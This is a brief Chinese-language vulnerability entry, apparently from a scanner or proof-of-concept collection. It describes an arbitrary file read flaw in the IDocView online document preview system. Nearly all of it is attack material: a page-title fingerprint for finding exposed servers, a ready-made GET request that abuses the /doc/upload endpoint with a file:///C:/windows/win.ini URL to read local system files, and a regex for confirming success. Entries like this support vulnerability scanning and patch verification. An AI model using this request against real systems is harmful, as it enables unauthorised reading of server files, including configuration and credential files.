# IDocView在线文档预览系统存在任意文件读取漏洞

IDocView ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title=="在线文档预览 - I Doc View"`
- **请求**：`GET /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt HTTP/1.1`
- **响应特征**：200 ^(?=.*?txt)(?=.*?success).*?$